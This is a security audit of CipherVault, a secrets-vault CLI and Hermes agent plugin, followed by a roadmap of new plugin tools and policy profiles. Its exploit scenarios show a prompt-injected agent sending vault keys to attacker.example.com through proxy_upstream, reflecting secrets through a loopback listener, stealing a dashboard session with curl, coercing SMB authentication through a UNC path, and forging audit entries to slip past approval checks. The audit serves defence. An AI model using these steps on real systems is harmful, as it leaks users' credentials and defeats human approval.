# CipherVault Security Vulnerability Audit & Hermes Plugin Enhancement Roadmap

> **Scope:** Independent engineering & security review of the CipherVault workspace (`crates/*`, `apps/cli`, `services/mcp`, and `plugins/ciphervault`), focusing on control-plane security vulnerabilities, core CLI/architecture improvements, and concrete features/meta-workflows to turn the CipherVault Hermes plugin into a high-leverage daily developer tool.

---

## Status update (18 November 2026, CLI v1.0.35, Hermes plugin v0.7.0)

This document is the point-in-time review that drove the v1.0.33 to v1.0.35 work. **Most of what it recommends has since shipped.** The sections below are kept as written, so their file and line references describe the code as it was reviewed, before the fixes. Use this table, not those line numbers, to see where things stand. "Verified" means checked against the current code in this pass; it is not a re-audit.

### Findings

| Finding | Status | What the current code shows |
|---|---|---|
| **Vuln-1** Agent-controlled `proxy_upstream` | **Mitigated** | `ciphervault mcp` never forwards an agent-supplied `proxy_upstream` (covered by tests). The plugin still accepts it but only for public HTTPS, non-provider hosts, rejects loopback/private/link-local hosts and known-provider overrides, and merges human-pinned upstreams from `.ciphervault/policy.toml`. Residual: it is validated, not removed from the plugin schema; CLI-side loopback restrictions were not re-checked. |
| **Vuln-2** Blank `proxy_upstream` disables `--no-net` | **Fixed** | One `_clean_proxy_upstreams` helper feeds the effective-`no_net`, approval-prompt and run paths. |
| **Vuln-3** Coarse approval `rule_key` | **Fixed** | Grants bind program, profile, inline-code hash, network mode and `allow_keys` (see the plugin README). |
| **Vuln-4** Audit forgery and permissive safe-command regex | **Fixed** | The safe-command pattern now allows only `status`, `track`, `push`, `hook`, `audit`, `diff` and read-only `agent-log show/verify/check`; `init`, `rekey`, `prune`, `untrack`, `export-env`, and `agent-log record/anchor` are blocked from unapproved agent shells. Audit entries are signed under the domain `CipherVault-AgentAudit-v1`, and callers authenticate with a per-vault `audit_hmac.key`. Strict-verification details were not re-checked. |
| **Vuln-5** Scrubbing gaps | **Mostly fixed** | Verified: base64url forms, every PEM private-key block and bare body lines, and `#` treated as a comment only after whitespace (with tests). **Not confirmed:** shifted-base64 alignments, and `vault.db-wal` in the bridge cache fingerprint (no reference found). Treat those two as open. |
| **Vuln-6** `ui --local` unauthenticated session | **Fixed** | A bootstrap token or private session is required for `/api/context`; plaintext diff reveal over HTTP is disabled unless `CIPHERVAULT_UI_ALLOW_REVEAL=1`. |
| **Vuln-7** Legacy Python MCP and dashboard plugin API | **Partly fixed** | `plugin_api.py` now rejects UNC and non-directory `cwd`, uses a minimal environment, and exposes the sealed-state fields. The Python MCP server now goes through `ciphervault run --json`, uses a minimal environment and defaults to `--no-net`, but it is still a separate implementation rather than a launcher for `ciphervault mcp`. |

### Roadmap items

| Item | Status | Notes |
|---|---|---|
| `ciphervault_env_doctor` | **Shipped** | Native `ciphervault env-doctor`, exposed as a plugin tool. Differences from the sketch: no `EXPIRED_JWT` / `EXPIRING_CERT` lints, and no cross-environment drift report. |
| `ciphervault_secret_generate` | **Shipped** | Formats `base64url`, `hex`, `uuid`, `alphanumeric` (no `password` or `ed25519`). Returns name, format, length, short hash and sealed state. |
| `ciphervault_diff` | **Shipped** | Never passes `--reveal`. |
| `ciphervault_proxy_doctor` | **Shipped** | |
| `ciphervault_secret_prompt` and the desktop pane | **Shipped** | Secret Entry Drawer, Seal & shred `.env`, Env Health card, Agent Audit feed. |
| `.ciphervault/policy.toml` profiles and `sealed_mode` | **Shipped** | `[vault]` and `[profiles.*]` with `commands`, `allow_keys`, `no_net`, `proxy`, `upstreams`. The sketch's `description` and `require_explicit_approval` keys are **not** accepted (unknown keys are rejected). There is no `ciphervault policy init` command. |
| Ambient workspace posture | **Shipped** | `workspace_posture` on status and tool results, via the `tool_request` middleware. |
| `hermes ciphervault setup` wizard | **Shipped** | Binary, policy and `--wire-hermes`. |
| Windows `--no-net` | **Shipped** | AppContainer. Third-party Python packages can still fail to start under it; see [PLATFORM_SUPPORT.md](PLATFORM_SUPPORT.md). |
| Live CI on macOS and desktop Linux | **Open** | The Linux and macOS code paths exist but have not run on real hosts, and hosted CI is currently paused. |
| Install of v0.7.2 through the Hermes catalog | **Open** | The upstream catalog entry still pinned v0.6.5 on 19 November 2026. The update to v0.7.2 is in review ([NousResearch/hermes-agent#157417](https://github.com/NousResearch/hermes-agent/pull/157417)); until it merges, v0.7.2 installs from this repository. |

---

## 1. Executive Summary & Honest Assessment

CipherVault's **cryptographic foundation and defensive redaction layer are genuinely strong**. Primitives (`XChaCha20-Poly1305`, `HKDF-SHA256`, `Argon2id`, strict `Ed25519`, `X25519`, Shamir `GF(2^8)`), journaled crash-safe snapshot restoration (`crates/snapshot/src/restore.rs`), fail-closed exact + shape scrubbing (`crates/redact`, `plugins/ciphervault/__init__.py`), and native OS `--no-net` sandboxing (Linux `unshare`, macOS `sandbox-exec`, Windows AppContainer) put it well ahead of typical `.env` wrappers and naive agent plugins.

However, reading the full control-plane paths across the CLI, loopback proxy, MCP servers, dashboard APIs, and Hermes plugin reveals two overarching gaps:

1. **Control-Plane Seams Have Exploitable Bypass Paths:** While the vault encryption and output scrubber are tight, **7 concrete vulnerabilities** exist at the seams between the LLM/agent and the CLI — most critically around **agent-controlled `proxy_upstream` routing**, an **empty-string `--no-net` bypass in the approval hook**, **coarse session approval keys**, **forged agent audit receipts**, and **unauthenticated loopback dashboard endpoints**.
2. **The Hermes Plugin Is 90% Defensive ("No") and Only 10% Constructive ("How"):** Today, the plugin excels at *stopping* an agent from reading `.env` or leaking stdout, and running commands inside RAM. Yet it forces developers into painful dead ends during normal coding workflows:
   - **The "Day-0 / New Secret" Catch-22:** An agent scaffolding Next.js, FastAPI, or Postgres needs to generate `NEXTAUTH_SECRET` / `JWT_SECRET` or ask the developer for a `STRIPE_SECRET_KEY`. Today there is no zero-knowledge way to generate secrets inside the vault or collect human input out-of-band without secrets touching terminal stdout or chat history.
   - **The "Blind Debugging" Problem:** When an app fails due to a misconfigured `.env`, the agent is rightly blocked from reading `.env` — but has **zero diagnostic visibility** into missing keys vs. code/schema, empty values, trailing `\r` / unstripped quotes, invalid URLs, or cross-environment drift.
   - **Approval Fatigue vs. Coarse Grants:** Gating every `ciphervault_run` on a manual prompt trains users to click "Approve for session", which currently caches a dangerously coarse `ciphervault_run:<program>` rule key.

---

## 2. Newly Identified Security Vulnerabilities (Code-Verified)

### Vuln-1 `[CRITICAL]`: Agent-Controlled `proxy_upstream` Enables Arbitrary HTTPS & Loopback Credential Exfiltration

- **Locations:**
  - `apps/cli/src/commands/run_proxy.rs`: `validate_upstream_url` (lines 146–163), `parse_proxy_upstream_spec` (lines 165–184), `build_proxy_routes` (lines 192–243), `proxy_handler` (lines 357–488)
  - `plugins/ciphervault/__init__.py`: `_tool_run` (lines 758–763), `_TOOLS` schema for `ciphervault_run` (lines 1782–1783)
  - `apps/cli/src/commands/mcp.rs`: `ciphervault_run` tool definition & dispatch
- **Vulnerability Mechanics:**
  - Both the Hermes plugin and the Rust MCP server expose `proxy_upstream` (`VAR=https://host[@HeaderName]`) as an LLM-supplied tool parameter.
  - `validate_upstream_url` (`run_proxy.rs:146-163`) permits **any valid `https://` hostname on the public internet** and **any cleartext `http://` loopback host** (`127.0.0.1`, `localhost`, `::1`, `[::1]` on line 155).
  - `build_proxy_routes` (`run_proxy.rs:209-222`) allows `proxy_upstream` to override built-in `KNOWN_PROVIDERS` (`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `STRIPE_SECRET_KEY`, `GITHUB_TOKEN`, etc.) or attach **any** vault variable (`DATABASE_URL`, `AWS_SECRET_ACCESS_KEY`) to an arbitrary route.
- **Exploit Scenarios:**
  1. **Direct Remote Exfiltration:** A prompt-injected agent invokes `ciphervault_run(proxy=True, proxy_upstream=["STRIPE_SECRET_KEY=https://attacker.example.com"], command=["curl", ...])`. CipherVault's parent process injects the **real plaintext secret** into the `Authorization` header and transmits it over HTTPS to `attacker.example.com`.
  2. **Offline Loopback Reflection (Bypasses `--proxy` & Exact Scrubbing):** Even with no external network, the agent runs `ciphervault_run(proxy=True, proxy_upstream=["DATABASE_URL=http://127.0.0.1:19999"], command=["python", "-c", "..."])`. The child spawns a localhost listener on `:19999` and calls `CIPHERVAULT_PROXY_ROUTE_DATABASE_URL`; **CipherVault's parent proxy connects to `:19999` and hands the child the real plaintext secret inside the HTTP header**. The child can then chunk/obfuscate/reverse the secret before printing, bypassing exact-value output scrubbing.
- **Remediation:**
  1. **Remove `proxy_upstream` from LLM-callable tool schemas** (`plugins/ciphervault/__init__.py` and `apps/cli/src/commands/mcp.rs`). Upstream overrides must come exclusively from a human-authored workspace policy file (e.g. `.ciphervault/policy.toml`, write-protected from agents by `on_pre_tool_call`) or direct human CLI flags.
  2. In `run_proxy.rs`: disallow `http://127.0.0.1`/`localhost` upstreams in production builds unless an explicit CLI flag (e.g. `--allow-loopback-upstream`) is passed, and refuse overriding `KNOWN_PROVIDERS` hosts without `--allow-provider-override`.
  3. Also note `run_proxy.rs:366-395`: if a caller omits `/__cv/<slug>` and hits `/` with a placeholder header, route lookup falls back to iterating `state.routes`; restrict matching strictly to `/__cv/<slug>` or require explicit upstream path rules, and scrub headers on upstream error messages (`run_proxy.rs:452-458` scrubs error strings on line 439 for send failures, whereas `resp.bytes().await` read errors at lines 452–457 do not call `scrub_exact_values`).

---

### Vuln-2 `[CRITICAL]`: Blank `proxy_upstream=[""]` Disables `--no-net` While Spoofing `[proxy: real keys stay in parent]` in the Approval UI

- **Locations:**
  - `plugins/ciphervault/__init__.py`: `_effective_no_net` (lines 727–735), `_tool_run` (lines 758–765), `on_pre_tool_call` (lines 1241–1273)
- **Vulnerability Mechanics:**
  - Suppose a model calls `ciphervault_run(command=["python", "script.py"], proxy=False, proxy_upstream=[""])` (or `["   "]`):
    1. `_effective_no_net` (`line 733`) evaluates `params.get("proxy") or params.get("proxy_upstream")`. In Python, `[""]` is **truthy**, so `_effective_no_net` returns `False` — silently omitting `--no-net`.
    2. `on_pre_tool_call` (`line 1242`) computes `proxy_on = bool(... (args.get("proxy") or args.get("proxy_upstream")))` → `True`, displaying `[proxy: real keys stay in parent]` (`line 1266`) to the human approver.
    3. `_tool_run` (`lines 760–763`) strips each entry (`s = str(spec).strip()`) and skips empty strings, so neither `--proxy` nor `--proxy-upstream` is passed to `ciphervault run`.
- **Impact:** The human approves what appears to be a proxy-isolated execution where real keys stay out of child memory, while the CLI actually executes with **all plaintext secrets injected into child RAM AND unrestricted network access (`--no-net` off)**.
- **Remediation:**
  - Parse/normalize `proxy_upstream` in a single helper (`_clean_proxy_upstreams(params)`) shared across `_effective_no_net`, `on_pre_tool_call`, and `_tool_run` — and remove `proxy_upstream` from agent parameters entirely per Vuln-1.
  - Additionally, enforce `--no-net` fail-closed defaults inside `on_pre_tool_call` by flagging `proxy=False` + `no_net=False` in high-contrast warning text whenever `os` supports `--no-net`.

---

### Vuln-3 `[HIGH]`: Coarse Approval `rule_key` (`ciphervault_run:<program>`) Allows Privilege Escalation Across Session Grants

- **Location:** `plugins/ciphervault/__init__.py`: `on_pre_tool_call` (lines 1257–1273)
- **Vulnerability Mechanics:**
  - When approving `ciphervault_run`, `on_pre_tool_call` emits:
    ```python
    program = str(((args or {}).get("command") or ["run"])[0])
    ...
    "rule_key": f"ciphervault_run:{program}"
    ```
  - If a developer approves a restricted, offline test run like `ciphervault_run(command=["python", "-m", "pytest"], allow_keys=["TEST_DSN"], no_net=True)` with **"Approve for session / Always allow"**, Hermes stores `ciphervault_run:python`.
  - Any subsequent call `ciphervault_run(command=["python", "-c", "..."], allow_keys=None, no_net=False)` computes the **exact same `rule_key`** (`ciphervault_run:python`) and escalates from 1 test variable + `--no-net` to **every vault secret + full network** with zero user prompt.
- **Remediation:**
  - Scope `rule_key` to the full security envelope:
    - network mode (`no_net` / `proxy` / `unrestricted`)
    - `allow_keys` set (or `"ALL"`)
    - resolved `vault_cwd`
    - subcommand/script target (never permit `"always allow"` or bare `python` grants when `-c`, `-e`, `eval`, or shell binaries like `bash`/`sh`/`pwsh`/`cmd` are used).

---

### Vuln-4 `[HIGH]`: Unauthenticated `agent-log record` & Permissive Safe-Command Regex Allow Audit Forgery and Unapproved Vault Mutation

- **Locations:**
  - `plugins/ciphervault/__init__.py`: `_SAFE_SECRET_PATH_CMD_RE` (lines 1148–1153)
  - `apps/cli/src/commands/agent_log.rs`: `AgentLogSubcommand::Record` (lines 104–112), `anchor_agent_audit` (lines 51–58)
  - `apps/cli/src/commands/agent_bridge.rs`: `handle_stdio_line` `Some("audit")` (lines 474–490)
  - `crates/local-store/src/db.rs`: `append_agent_audit` (lines 1273–1317), `verify_agent_audit` (lines 1391–1443)
- **Vulnerability Mechanics:**
  1. `_SAFE_SECRET_PATH_CMD_RE` (`plugins/ciphervault/__init__.py:1150`) allows `terminal` commands starting with:
     `(?:ciphervault|cv)(?:\.exe)?\s+(?:status|track|untrack|push|hook|init|audit|agent-log|diff|rekey|prune)\b`
     This lets the agent directly invoke:
     - `ciphervault agent-log record --tool ciphervault_run --decision scrubbed_result --detail '{"output_sha256":"<fake>","content_sha256":"<fake>"}'` → signs arbitrary fake scrub receipts with `device_sk`, poisoning `ciphervault_audit(check_text=...)`.
     - `ciphervault init` → prints recovery secret directly to terminal stdout (contradicting `SKILL.md` Rule #2: *"Never wrap `init` as an agent action"*).
     - `ciphervault untrack`, `ciphervault prune`, `ciphervault rekey` → mutates vault retention/tracking without tool approval.
  2. In `crates/local-store/src/db.rs:1296`, `append_agent_audit` constructs the hash preimage as raw `\n`-delimited text:
     `format!("{prev_hash}\n{now}\n{tool}\n{decision}\n{path}\n{detail_json}")`
     without escaping or length-prefixing `\n`/`\r` inside `tool`/`decision`/`path`/`detail_json` (canonical ambiguity).
  3. Both `db.rs:1299` (`append_agent_audit`) and `agent_log.rs:53` (`anchor_agent_audit`) call raw `device_sk.sign(...)` rather than `ciphervault_crypto::sign_with_domain(...)` with an audit-specific domain context, and `verify_agent_audit` (`db.rs:1425`) + `VerifyRemote` (`agent_log.rs:243`) use `.verify()` rather than `.verify_strict()` with `is_weak()`.
- **Remediation:**
  - Split `_SAFE_SECRET_PATH_CMD_RE` to allow only strictly read-only / safe commands in `terminal`: `status`, `track`, `push`, `hook`, `diff` (already guarded against `--reveal`/`-r`), and read-only `agent-log (?:show|verify|check)\b`. Block `agent-log record`, `agent-log anchor`, `init`, `rekey`, `prune`, and `untrack` from unapproved agent `terminal` calls (and block `agent-log record` / `anchor` in `apps/cli/src/commands/agent_hooks.rs` too).
  - Switch `append_agent_audit` / `AuditCheckpoint` signatures to canonical CBOR or length-prefixed JSON signed via `ciphervault_crypto::sign_with_domain(..., b"CipherVault-AgentAudit-v1")` and verified via `verify_with_domain`.
  - Longer-term: require a per-session HMAC or OS-keyring/parent-process secret to invoke `agent-log record` so a compromised child process in `--no-net` cannot forge entries into `.ciphervault/vault.db` if the workspace is writable.

---

### Vuln-5 `[HIGH]`: Exact-Value Scrubbing & Secret Extraction Gaps (`base64url`, Unaligned Base64, Multi-PEM Body Lines, `#` in YAML/TOML)

- **Locations:**
  - `crates/redact/src/lib.rs`: `scrub_exact_values` (lines 518–566), `base64_encode` (lines 580–604), `match_vendor_token` (lines 252–304)
  - `apps/cli/src/commands/agent_bridge.rs`: `parse_secret_values` (lines 29–82), `collect_kv_lines` (lines 84–114)
- **Vulnerability Mechanics:**
  1. `scrub_exact_values` registers raw value, percent-encoded, standard Base64 (`+/` with `=` padding at phase 0), hex (upper/lower), and JSON-escaped variants — but misses:
     - **Base64URL** (`-_`, padded and unpadded), which is standard across JWTs, WebAuthn, OAuth, and Python `base64.urlsafe_b64encode`.
     - **Shifted Base64 alignments** (e.g., `base64("PREFIX=" + secret)` shifts 3-byte grouping by +1 or +2 bytes, completely changing every Base64 character).
     - **Individual body lines of PEM private keys** and **2nd+ PEM blocks** in a file: `agent_bridge.rs:55-60` only checks the first `text.find("-----BEGIN")` and only inserts the entire multi-line block as one needle. Printing line 3–6 of a PEM body (without headers) passes both exact matching and `match_private_pem`.
  2. `collect_kv_lines` (`agent_bridge.rs:108`) splits unquoted YAML/TOML/INI values on `val.split('#').next()`. A password like `db_pass: abc#def123` truncates to `abc`, which is `< MIN_EXACT_VALUE_LEN` (6) and leaves `abc#def123` unredacted on stdout!
  3. Notice `BridgeSecretCache::scrub_text` (`agent_bridge.rs:409`) vs `handle_stdio_line` (`agent_bridge.rs:448`): `cmd_redact` and `--stdio` fail closed if `cache.complete == false`, which is good, **but** `BridgeSecretCache::current_fingerprint()` (`agent_bridge.rs:359-384`) checks `.ciphervault/vault.db` mtime/size and tracked file mtimes — on Windows/SQLite WAL mode, committing a snapshot or tracking a file can update `vault.db-wal` without updating `vault.db`'s length or mtime immediately! That can briefly leave `BridgeSecretCache` serving stale secret lists until a checkpoint occurs.
- **Remediation:**
  - Add `vault.db-wal` to `BridgeSecretCache::current_fingerprint()` alongside `vault.db`.
  - Add `base64url` (padded/unpadded) and phase-shifted interior substrings (for secrets >= 12 bytes, the aligned middle bytes under shifts 0/1/2 produce stable substrings >= 8 Base64 chars) to `scrub_exact_values`.
  - Iterate all `-----BEGIN ... PRIVATE KEY-----` blocks in `parse_secret_values` and register each base64 body line (>= 16 chars) as an exact needle.
  - In `collect_kv_lines`, only treat `#` as a comment delimiter when preceded by whitespace (`" #"` or `"\t#"`).

---

### Vuln-6 `[MEDIUM-HIGH]`: `ciphervault ui --local` Mints Unauthenticated Loopback Sessions & Exposes Plaintext Restore/Diff to Local Processes

- **Locations:**
  - `apps/cli/src/dashboard/handlers.rs`: `api_private_context_handler` (lines 23–52), `private_ui_request_guard_in_context` (lines 356–459)
  - `apps/cli/src/dashboard/files_api.rs`: `api_diff_handler` (lines 21–37), `api_snapshots_restore_handler` (lines 96–129)
- **Vulnerability Mechanics:**
  - While `private_ui_request_guard_in_context` enforces loopback `Host`/`Origin` (mitigating cross-site browser CSRF), `GET http://127.0.0.1:8080/api/context` (`handlers.rs:393, 416, 448`) **bypasses `session_valid`** and immediately returns `Set-Cookie: ciphervault_private_session=<token>`.
  - Any local command (including an AI agent running `curl -c jar http://127.0.0.1:8080/api/context && curl -b jar "http://127.0.0.1:8080/api/diff?reveal=true"` or `POST /api/snapshots/restore` with `Origin: http://127.0.0.1:8080`) obtains a valid session cookie and can read plaintext diffs or restore decrypted secrets to `/tmp/out` — completely bypassing `on_pre_tool_call`'s `_EXPORT_ENV_RE` / `_SECRET_FILE_RE` checks and leaving **zero records in `agent_audit`**.
  - Furthermore, if the user has linked a local account (`ensure_local_account_session` at `session.rs:146-189`), `ui --local` auto-logs in at startup so `private_account_session_valid()` immediately returns `true`.
- **Remediation:**
  - Generate an ephemeral high-entropy startup bootstrap token when `ciphervault ui --local` starts (open browser to `http://127.0.0.1:<port>/?token=<bootstrap>`), require that token once to mint `ciphervault_private_session`, and reject unauthenticated `GET /api/context` calls.
  - Disable `reveal=true` on `/api/diff` unless `--allow-ui-reveal` (or an interactive confirmation / WebAuthn/TOTP step-up) is enabled, and log restore/reveal calls in `agent_audit`.
  - Block loopback dashboard requests to `127.0.0.1:<port>/api/` (and `localhost` `/api/diff`, `/api/snapshots/restore`) in `on_pre_tool_call` / `agent_hooks.rs`.

---

### Vuln-7 `[MEDIUM]`: Legacy Python MCP Server (`services/mcp/ciphervault_mcp_server.py`) & Dashboard Plugin API (`plugins/ciphervault/dashboard/plugin_api.py`) Drift & Coercion Risks

- **Locations:**
  - `services/mcp/ciphervault_mcp_server.py` (lines 82–91, 223–324)
  - `plugins/ciphervault/dashboard/plugin_api.py` (lines 38–80)
- **Vulnerability Mechanics:**
  1. `services/mcp/ciphervault_mcp_server.py` maintains a separate Python MCP implementation alongside the hardened Rust `ciphervault mcp` (`apps/cli/src/commands/mcp.rs`). Unlike `ciphervault mcp` and the Hermes plugin, the Python server:
     - **Never passes `--no-net`** on `ciphervault_run_in_memory`.
     - **Passes full `os.environ`** into subprocesses instead of `_minimal_env()`.
     - **Lacks `allow_keys`, `proxy`, `shred_working_copy`, and `agent_audit` receipts**.
     - Does not use `ciphervault redact --json` / check `exact_values_complete`.
  2. `plugins/ciphervault/dashboard/plugin_api.py:47-55` passes the HTTP query parameter `?cwd=...` straight to `subprocess.run([binary, "status", "--json"], cwd=cwd, ...)` **without** validating `cwd` or passing `env=_minimal_env()`. On Windows, `?cwd=\\attacker.example\share` can coerce SMB/Net-NTLMv2 auth from the plugin backend, and an arbitrary path can probe other directories. It also omits `"working_tree_sealed"` and `"working_tree_plaintext_files"` from the `keep` allow-list (`lines 63–67`).
- **Remediation:**
  - Convert `services/mcp/ciphervault_mcp_server.py` into a thin launcher that delegates directly via `os.execvp` / `subprocess` to `ciphervault mcp` so there is a **single hardened MCP implementation**.
  - In `plugins/ciphervault/dashboard/plugin_api.py`, reject UNC/non-directory `cwd` values (`not cwd.startswith(("\\\\", "//"))` and `Path(cwd).resolve().is_dir()`), add `env=_minimal_env()`, and add `"working_tree_sealed"` and `"working_tree_plaintext_files"` to `keep`.

---

## 3. Core CipherVault Improvements Needed (Outside the Plugin)

1. **Unify Windows AppContainer Limitations (`apps/cli/src/commands/run.rs`):**
   - Document and handle third-party Python `site-packages` when `no_net=True` (either include `site-packages` opt-in staging or detect `ModuleNotFoundError` and surface a clear remediation hinting `--proxy` or WSL2 `--no-net`).
   - Add an automatic read-only ACL check or explicit diagnostic when `cwd` is a user-private directory outside `%TEMP%` lacking `S-1-15-2-1` RX permissions.
   - Surface the `0xC0000135` / `0xC0000142` AppContainer hint inside `--json` output (currently only printed on non-JSON runs at `run.rs:1033-1040`).
2. **Real Multi-OS CI Validation:**
   - Re-enable/run CI on Linux (`ubuntu-latest` with `pcscd` + D-Bus `secret-tool`) and macOS (`macos-latest` with `sandbox-exec`, `security -i`, and `PCSC.framework`) so the `#[cfg(target_os = "linux")]` and `#[cfg(target_vendor = "apple")]` paths have full live execution evidence matching Windows.
3. **Eliminate Dual-Stack & Legacy Crypto Footguns:**
   - Remove plaintext `working_copy` fallback ambiguity where possible by encouraging `--shred` (`seal`) mode as a first-class vault mode (`vault.mode = "sealed"` persisted in `.ciphervault` config so every `push` automatically shreds without needing `--shred` every time).
   - Add a `ciphervault redact --stdio` protocol version handshake and include `vault.db-wal` in `BridgeSecretCache::current_fingerprint()`.
4. **Hardening `agent_hooks.rs` CLI Parsing:**
   - Currently `blocked_cli_secret_command` in `apps/cli/src/commands/agent_hooks.rs` inspects the first token after `ciphervault`/`cv`. Support full clap-style flag skipping (e.g., global flags before subcommands) and block loopback URLs pointing to `ciphervault ui --local` (`127.0.0.1:8080/api/diff`, `/api/snapshots/restore`).

---

## 4. Deep-Dive: Improving & Enhancing the Hermes Plugin (And Making It Indispensable for Developers)

### Honest Product Critique
Right now, CipherVault for Hermes feels like a **security guard standing at the door**: it blocks reads, blocks `git push` on sprawl, scrubs output, and pops up an approval dialog whenever the agent wants to run code with env vars.

For a developer or AI engineer using Hermes every day, security that *only* adds friction eventually gets turned off or worked around. To make CipherVault something developers **love having installed** — and something no generic agent sandbox can match — the plugin needs to shift from **passive blocker** to **active Zero-Knowledge Secrets Co-Pilot**.

Below are the highest-leverage improvements, **new Hermes tools**, and **"meta-way" workflows** to build next.

---

### A. Concrete New Developer Tools for the Hermes Plugin

#### 1. `ciphervault_env_doctor` — Zero-Knowledge Env & Config Diagnostics *(Highest Developer ROI)*
- **The Pain Point:** Every developer hits `"KeyError: 'REDIS_URL'"`, `"connection refused (localhost instead of container)"`, `"JWT malformed"`, or `"Invalid Stripe key"` while debugging with an AI agent. Currently, CipherVault blocks the agent from inspecting `.env`, leaving the agent guessing blindly.
- **How It Works (100% Zero-Knowledge Inside Rust):**
  - Scans codebase env lookups (`process.env.*`, `import.meta.env.*`, `os.environ` / `os.getenv`, `std::env::var`, Docker Compose `${VAR}`, Prisma `env("VAR")`, and `.env.example` / `env.mjs` / `pydantic` settings).
  - Cross-references them in memory against the active vault snapshot (or `.env.*`) and outputs a **structural diagnostic JSON** — *zero plaintext values ever leave Rust*:
    - `missing_from_vault`: referenced in code / `.env.example`, absent in vault.
    - `unused_in_code`: present in vault, unreferenced in repo.
    - `env_drift`: keys present in `.env.development` / `.env` but missing from `.env.production` / `.env.test`.
    - `value_lint_findings` (evaluated locally in Rust):
      - `EMPTY_VALUE`, `WHITESPACE_WRAPPED`, `UNSTRIPPED_QUOTES`, `PLACEHOLDER_DETECTED` (`CHANGEME`, `your-key-here`, `xxx`)
      - `INVALID_URL` on `*_URL` / `*_URI` / `*_ENDPOINT` (reports scheme + host validity without printing credentials!)
      - `INVALID_JSON` on `*_JSON`
      - `PREFIX_MISMATCH` (e.g., `STRIPE_SECRET_KEY` doesn't start with `sk_`, `ANTHROPIC_API_KEY` doesn't start with `sk-ant-`)
      - `EXPIRED_JWT` / `EXPIRING_CERT` (parses `exp` claim / X.509 `notAfter` locally and reports days remaining)
  - Optional `sync_example: true` mode: safely generates/updates `.env.example` with inferred comments and fake placeholder shapes without touching any real secret.

#### 2. `ciphervault_secret_generate` — Zero-Knowledge In-Vault Secret Generation
- **The Pain Point:** Agents constantly need to generate local secrets when scaffolding auth, webhooks, or DB stacks (`NEXTAUTH_SECRET`, `JWT_SIGNING_KEY`, `SESSION_SECRET`, `POSTGRES_PASSWORD`, `HMAC_KEY`, Ed25519 keypairs). If the agent runs `openssl rand` in `terminal`, the secret enters the LLM context window (and terminal history)!
- **How It Works:**
  - Tool signature: `ciphervault_secret_generate(name, format="base64url|hex|uuid|password|ed25519", length_bytes=32, env_file=".env", seal=True)`
  - Rust CLI generates entropy from `OsRng`, injects/updates the key inside the encrypted vault snapshot (and optionally seals/shreds `.env`), and returns only:
    ```json
    {
      "name": "NEXTAUTH_SECRET",
      "format": "base64url",
      "length_chars": 43,
      "fingerprint_sha256_8": "8c1f4a92",
      "snapshot_head": "4b91e0...",
      "sealed": true
    }
    ```
  - **Result:** The app gets a cryptographically strong secret immediately usable by `ciphervault_run`, and **neither the LLM nor chat logs ever saw a single byte of it**.

#### 3. `ciphervault_secret_prompt` — Out-of-Band Human Secret Input (Never Paste Secrets in Chat!)
- **The Pain Point:** Users constantly paste their `OPENAI_API_KEY` or `DATABASE_URL` directly into chat when the agent says *"Please set `OPENAI_API_KEY`."* Once pasted into chat, it's in the prompt transcript and sent to the LLM provider forever.
- **How It Works:**
  - When an agent needs a user-supplied secret, it calls `ciphervault_secret_prompt(keys=[{"name": "STRIPE_SECRET_KEY", "reason": "Needed for checkout tests", "expected_prefix": "sk_test_"}])`.
  - Hermes / the desktop pane (or TTY `rpassword` prompt) displays a masked native input field wired straight to `ciphervault secret set --stdin` + `ciphervault push --local --shred`.
  - The tool returns only `{"configured": ["STRIPE_SECRET_KEY"], "shape_ok": true, "sealed": true}` to the agent.

#### 4. `ciphervault_diff` — Zero-Knowledge Key-Level Diff Between Snapshots / Working Tree
- **The Pain Point:** `ciphervault diff` already exists in the CLI (and masks values by default!), yet the plugin doesn't expose it. Agents making changes or checking why staging differs from local have no tool for it.
- **How It Works:** Expose `ciphervault diff --json` (hard-coded *without* `--reveal`) as `ciphervault_diff(from_ref="HEAD", to_ref="working", env_file=None)` returning only added/removed/changed key names and hashed value-change indicators.

#### 5. `ciphervault_proxy_doctor` (or Live Network-Allowlist Test)
- **The Pain Point:** Developers hit cryptic connection errors when `no_net=True` blocks an API call they didn't know a test suite made, or when a library ignores `OPENAI_BASE_URL` under `--proxy`.
- **How It Works:** Runs a `dry_run` proxy route check reporting *which* vault keys match `KNOWN_PROVIDERS` and which child env vars (`OPENAI_BASE_URL`, `ANTHROPIC_BASE_URL`, `GEMINI_BASE_URL`, etc.) will receive placeholders — before waiting on a failing integration test.

---

### B. The "Meta-Way": Intent-Based Policy Profiles & Ambient Guard Architecture

Giving an LLM more raw knobs (`allow_keys`, `proxy`, `proxy_upstream`, `no_net`) actually **hurts both UX and security**:
- More parameters increase tool-call mistakes and token overhead.
- Security boundaries (`no_net`, `allow_keys`, `proxy` upstreams) **should never be proposed solely by the untrusted model**!

Here is a much stronger **"meta" architecture** for CipherVault in Hermes:

#### 1. Declarative `.ciphervault/policy.toml` Execution Profiles (Human-Owned Policy, Agent-Chosen Profile)
- The developer (or an onboarding wizard / `ciphervault policy init`) maintains `.ciphervault/policy.toml` — and `on_pre_tool_call` treats `.ciphervault/policy.toml` as a **protected config** (blocking autonomous agent edits to it unless explicitly approved):
  ```toml
  [vault]
  sealed_mode = true          # automatically shred working tree plaintext on every push
  default_no_net = true

  [profiles.test]
  description = "Run unit tests offline with test DB credentials only"
  commands = ["pytest", "npm test", "cargo test", "vitest"]
  allow_keys = ["DATABASE_URL", "REDIS_URL", "TEST_*"]
  no_net = true

  [profiles.llm_eval]
  description = "Run eval scripts with proxied LLM keys (keys stay in parent process)"
  commands = ["python", "node"]
  allow_keys = ["OPENAI_API_KEY", "ANTHROPIC_API_KEY", "GEMINI_API_KEY"]
  proxy = true
  # Human-pinned upstreams only — agent cannot alter these:
  upstreams = { CUSTOM_GATEWAY_KEY = "https://gateway.company.com" }

  [profiles.migrate]
  description = "Run DB migrations with production DATABASE_URL"
  allow_keys = ["DATABASE_URL"]
  require_explicit_approval = true
  ```
- **What changes for the agent & user:**
  - The agent calls `ciphervault_run(profile="test", command=["pytest", "-q"])`.
  - The CLI itself enforces `allow_keys`, `no_net`, `proxy`, and pinned `upstreams` from `.ciphervault/policy.toml`.
  - Approval prompts shrink from scary wall-of-text warnings to crisp scoped grants (`rule_key = "ciphervault_run:profile:test"`), eliminating both approval fatigue and Vuln-1/2/3!

#### 2. `ciphervault_doctor` / Session Startup Middleware (`on_tool_request` + Ambient Status)
